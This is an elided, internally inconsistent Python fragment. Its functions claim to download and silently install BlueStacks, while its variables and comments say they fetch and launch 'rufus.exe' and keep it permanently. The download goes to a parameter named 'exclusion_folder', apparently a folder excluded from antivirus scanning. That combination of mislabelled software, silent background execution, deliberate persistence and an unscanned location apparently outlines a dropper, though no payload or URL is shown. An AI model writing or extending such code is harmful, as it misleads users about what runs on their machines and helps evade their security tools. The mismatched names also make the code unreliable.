...
def download_bluestacks(exclusion_folder):
    """Download BlueStacks with error handling and progress tracking"""
...
def install_bluestacks(filename, exclusion_folder):
    """Install BlueStacks silently in the background"""
    try:
        if not filename or not os.path.exists(filename):
            return "Installation failed: File not found"
        
        if not exclusion_folder:
            return "Installation failed: Invalid directory"
        
        # Just launch the application from its permanent location
...
def main():
    ...
    try:
        ...
        # Download rufus directly to permanent location
        rufus_path = download_bluestacks(exclusion_folder)
        if not rufus_path:
            sys.exit(1)
        
        # Launch rufus from permanent location
        result = install_bluestacks(rufus_path, exclusion_folder)
        
        # Don't delete anything - rufus.exe stays permanently
